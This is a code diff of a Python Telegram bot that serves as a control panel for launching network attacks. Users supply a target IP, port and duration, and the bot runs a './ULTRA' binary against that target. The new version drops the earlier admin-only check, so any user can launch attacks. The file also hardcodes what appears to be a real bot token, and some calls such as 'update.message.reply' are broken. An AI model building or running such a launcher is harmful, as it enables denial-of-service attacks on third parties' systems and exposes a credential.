@@ -1,233 +1,130 @@
-import os
-import asyncio
-import secrets  # For generating secure random keys
-import time  # For tracking redemption time
+import subprocess
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler
-from telegram.error import TelegramError
+from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler, MessageHandler, filters
+import logging
 
-# Replace with your bot token from BotFather
+# Your bot's token
 TELEGRAM_BOT_TOKEN = '7718765612:AAEsrz7uXxsq_aDoPjncPdOD73z3WLOEVz0'
-ALLOWED_USER_ID = 6135948216  # Admin user ID
-bot_access_free = True  
 
-# In-memory storage for the generated key, redemption status, and user interactions
-generated_key = None
+# Admin user ID
+ALLOWED_USER_ID = 6135948216  # Replace with your admin's Telegram user ID
+
+# In-memory storage for tracking generated keys (for demo purposes)
+generated_key = "example_key"
 key_redeemed = True
-redeem_time = None  # Timestamp of key redemption
-user_ids = set()  # Set to store unique user IDs who interacted with the bot
-approved_users = set()  # Set of users who have been approved
 
-# Handlers for commands
+# Store user IDs (for broadcast)
+user_ids = set()
 
+# Enable logging
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+                    level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+# User state storage
+user_state = {}
+
+# Start command to display the styled buttons
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
-    user_id = update.effective_user.id  # Get the ID of the user interacting with the bot
 
-    # Track the user ID
-    user_ids.add(user_id)
+    # Add user to the list of users who have interacted with the bot
+    user_ids.add(update.effective_user.id)
 
-    # Create inline keyboard with buttons
+    # Create inline keyboard buttons with styling
     keyboard = [
-        [InlineKeyboardButton("Launch Attack", callback_data='launch_attack')],
-        [InlineKeyboardButton("Check Status", callback_data='check_status')],
+        [InlineKeyboardButton("⚡ Launch Attack ⚡", callback_data='launch_attack')],
+        [InlineKeyboardButton("📊 Check Status", callback_data='check_status')],
+        [InlineKeyboardButton("❓ Help", callback_data='help')],
+        [InlineKeyboardButton("🔑 Redeem Key", callback_data='redeem_key')],
     ]
+    
+    # Create reply markup to include the keyboard with buttons
     reply_markup = InlineKeyboardMarkup(keyboard)
-
+    
+    # Send a styled message with the inline buttons
     message = (
         "*🔥 Welcome to the battlefield! 🔥*\n\n"
         "*Use the buttons below to proceed!*\n"
     )
-    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown', reply_markup=reply_markup)
+    await context.bot.send_message(
+        chat_id=chat_id,
+        text=message,
+        parse_mode='Markdown',  # Markdown allows styling like bold, italics, etc.
+        reply_markup=reply_markup  # Attach the inline keyboard to the message
+    )
 
+# Handle the button presses
 async def handle_button(update: Update, context: CallbackContext):
     query = update.callback_query
-    await query.answer()
+    await query.answer()  # Acknowledge the button press
 
-    # Handle different button presses based on callback_data
+    # Different actions for different button presses
     if query.data == 'launch_attack':
-        # Ask for the target IP, port, and duration
-        await query.edit_message_text(
-            text="*⚔️ Enter the details for the attack:*\n*Format: /attack <ip> <port> <duration>*",
-            parse_mode='Markdown'
-        )
+        # Ask for IP, Port, and Duration
+        await query.edit_message_text("🔧 *Please provide the IP address for the attack:*")
+        user_state[query.from_user.id] = {'step': 'ip'}
     elif query.data == 'check_status':
-        # Show the status of the key and redemption
-        await status(update, context)
-
-async def run_attack(chat_id, ip, port, duration, context):
-    try:
-        process = await asyncio.create_subprocess_shell(
-            f"./ULTRA {ip} {port} {duration} 20",
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
+        # Show current key and redemption status
+        status_message = (
+            "*🔑 Current Key: " + (generated_key if generated_key else "No key generated yet") + "*\n"
+            "*Status: " + ("Redeemed" if key_redeemed else "Not redeemed") + "*"
         )
-        stdout, stderr = await process.communicate()
-
-        if stdout:
-            print(f"[stdout]\n{stdout.decode()}")
-        if stderr:
-            print(f"[stderr]\n{stderr.decode()}")
-
-    except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
-
-    finally:
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
-
-async def attack(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id  # Get the ID of the user issuing the command
-
-    # Check if the user is allowed to use the bot
-    if user_id != ALLOWED_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
-        return
-
-    args = context.args
-    if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
-        return
-
-    ip, port, duration = args
-    await context.bot.send_message(chat_id=chat_id, text=( 
-        f"*⚔️ Attack Launched! ⚔️*\n"
-        f"*🎯 Target: {ip}:{port}*\n"
-        f"*🕒 Duration: {duration} seconds*\n"
-        f"*🔥 Let the battlefield ignite! 💥*"
-    ), parse_mode='Markdown')
-
-    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
-
-async def genkey(update: Update, context: CallbackContext):
-    global generated_key  # Reference the global generated_key variable
-
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id  # Get the ID of the user issuing the command
-
-    # Check if the user is the admin
-    if user_id != ALLOWED_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
-        return
-
-    # Generate a secure random key
-    generated_key = secrets.token_urlsafe(16)  # Generates a 16-byte secure token (alphanumeric)
-    
-    # Reset redemption status and time
-    global key_redeemed, redeem_time
-    key_redeemed = False
-    redeem_time = None  # Reset the redemption time
-
-    # Send the generated key to the admin
-    await context.bot.send_message(chat_id=chat_id, text=f"*🔑 Your generated key: {generated_key}*", parse_mode='Markdown')
-
-async def redeem(update: Update, context: CallbackContext):
-    global generated_key, key_redeemed, redeem_time  # Reference the global variables
-
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id  # Get the ID of the user redeeming the key
-
-    # Ensure the key exists and has not already been redeemed
-    if not generated_key:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No key has been generated yet!*", parse_mode='Markdown')
-        return
-
-    if key_redeemed:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ The key has already been redeemed!*", parse_mode='Markdown')
-        return
-
-    # Redeem the key
-    key_redeemed = True
-    redeem_time = time.time()  # Store the redemption time
-
-    await context.bot.send_message(chat_id=chat_id, text=f"*🔑 Key redeemed successfully!* Your key: {generated_key}", parse_mode='Markdown')
-
-# The 'status' function you requested
-async def status(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id  # Get the ID of the user requesting the status
-
-    # Check if the user is authorized to view the status
-    if user_id != ALLOWED_USER_ID:
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text="*❌ You are not authorized to use this command!*",
-            parse_mode='Markdown'
+        await query.edit_message_text(status_message, parse_mode='Markdown')
+    elif query.data == 'help':
+        await query.edit_message_text(
+            "❓ *Help Information goes here.* ❓\n\n"
+            "*Use the following commands:* \n"
+            "- `⚡ Launch Attack`: Executes the `./ULTRA` binary with specified IP, port, and duration.\n"
+            "- `🔑 Redeem Key`: Redeems the current key if available."
         )
+    elif query.data == 'redeem_key':
+        global key_redeemed
+        if not key_redeemed:
+            key_redeemed = True
+            await query.edit_message_text(f"*🔑 Key Redeemed Successfully!* \nYour key: {generated_key}", parse_mode='Markdown')
+        else:
+            await query.edit_message_text("*⚠️ Key already redeemed!*", parse_mode='Markdown')
+
+# Handle text messages for input collection
+async def handle_message(update: Update, context: CallbackContext):
+    user_id = update.effective_user.id
+    text = update.message.text
+
+    if user_id not in user_state:
         return
 
-    # Show current status of key and redemption
-    if not generated_key:
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text="*⚠️ No key has been generated yet!*",
-            parse_mode='Markdown'
-        )
-    else:
-        redemption_status = "Redeemed" if key_redeemed else "Not redeemed"
-        redeem_time_msg = (
-            f"\n*⌛ Redeemed at: {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(redeem_time))}*"
-            if key_redeemed else ""
-        )
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text=(
-                f"*🔑 Current Key: {generated_key}*\n"
-                f"*Status: {redemption_status}*"
-                f"{redeem_time_msg}"
-            ),
-            parse_mode='Markdown'
-        )
+    state = user_state[user_id]
 
-# Admin commands for approving or disapproving users
-async def approve(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id  # Get the ID of the user issuing the command
+    if state['step'] == 'ip':
+        # Save IP address and ask for port
+        user_state[user_id]['ip'] = text
+        await update.message.reply("🌐 *IP saved!* Now, please provide the port number:")
+        user_state[user_id]['step'] = 'port'
+    elif state['step'] == 'port':
+        # Save port and ask for duration
+        user_state[user_id]['port'] = text
+        await update.message.reply("⚙️ *Port saved!* Now, please provide the duration of the attack in seconds:")
+        user_state[user_id]['step'] = 'duration'
+    elif state['step'] == 'duration':
+        # Save duration and execute attack
+        user_state[user_id]['duration'] = text
+        ip = user_state[user_id]['ip']
+        port = user_state[user_id]['port']
+        duration = user_state[user_id]['duration']
+        
+        # Run the ./ULTRA binary with parameters
+        try:
+            result = subprocess.run(["./ULTRA", ip, port, duration], capture_output=True, text=True)
+            output = result.stdout if result.returncode == 0 else result.stderr
+            await update.message.reply(f"⚡ *Attack Launched!* ⚡\n\n*ULTRA Output:* {output}")
+        except Exception as e:
+            await update.message.reply(f"⚠️ *Failed to execute ./ULTRA:* {str(e)}")
+        
+        # Reset state after execution
+        del user_state[user_id]
 
-    # Check if the user is the admin
-    if user_id != ALLOWED_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
-        return
-
-    if not context.args:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You must specify a user ID to approve!*", parse_mode='Markdown')
-        return
-
-    target_user_id = context.args[0]
-
-    if target_user_id not in user_ids:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User ID {target_user_id} not found!*", parse_mode='Markdown')
-        return
-
-    approved_users.add(target_user_id)
-    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User ID {target_user_id} approved!*", parse_mode='Markdown')
-
-async def disapprove(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id  # Get the ID of the user issuing the command
-
-    # Check if the user is the admin
-    if user_id != ALLOWED_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
-        return
-
-    if not context.args:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You must specify a user ID to disapprove!*", parse_mode='Markdown')
-        return
-
-    target_user_id = context.args[0]
-
-    if target_user_id not in user_ids:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User ID {target_user_id} not found!*", parse_mode='Markdown')
-        return
-
-    if target_user_id in approved_users:
-        approved_users.remove(target_user_id)
-        await context.bot.send_message(chat_id=chat_id, text=f"*❌ User ID {target_user_id} disapproved!*", parse_mode='Markdown')
-    else:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User ID {target_user_id} is not approved!*", parse_mode='Markdown')
-
-# Admin command for broadcasting a message
+# Broadcast command for the admin to send a message to all users
 async def broadcast(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id  # Get the ID of the user issuing the command
@@ -237,34 +134,40 @@ async def broadcast(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
         return
 
+    # Ensure there is a message to broadcast
     if not context.args:
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ You must provide a message to broadcast!*", parse_mode='Markdown')
         return
 
-    broadcast_message = ' '.join(context.args)  # Join all arguments to form the message
+    # Get the message from the user's input
+    broadcast_message = ' '.join(context.args)
 
-    for user_id in user_ids:
+    # Send the broadcast message to all users
+    for user_id in user_ids:  # Assuming user_ids is a set of all users who have interacted with the bot
         try:
-            await context.bot.send_message(user_id, broadcast_message)
-        except TelegramError as e:
-            print(f"Failed to send broadcast to {user_id}: {e}")
+            await context.bot.send_message(user_id, broadcast_message, parse_mode='Markdown')
+        except Exception as e:
+            print(f"Failed to send message to {user_id}: {e}")
 
     await context.bot.send_message(chat_id=chat_id, text="*📢 Broadcast message sent to all users!*", parse_mode='Markdown')
 
+# Main function to run the bot
 def main():
     """Start the bot and set up the handlers."""
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
 
-    application.add_handler(CommandHandler('start', start))
-    application.add_handler(CommandHandler('attack', attack))
-    application.add_handler(CommandHandler('genkey', genkey))
-    application.add_handler(CommandHandler('redeem', redeem))
-    application.add_handler(CommandHandler('status', status))
-    application.add_handler(CommandHandler('approve', approve))
-    application.add_handler(CommandHandler('disapprove', disapprove))
-    application.add_handler(CommandHandler('broadcast', broadcast))  # Add broadcast command
+    # Command handlers
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("broadcast", broadcast))
 
+    # Button callback handler
+    application.add_handler(CallbackQueryHandler(handle_button))
+
+    # Message handler to capture user input for attack parameters
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+
+    # Start the bot
     application.run_polling()
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
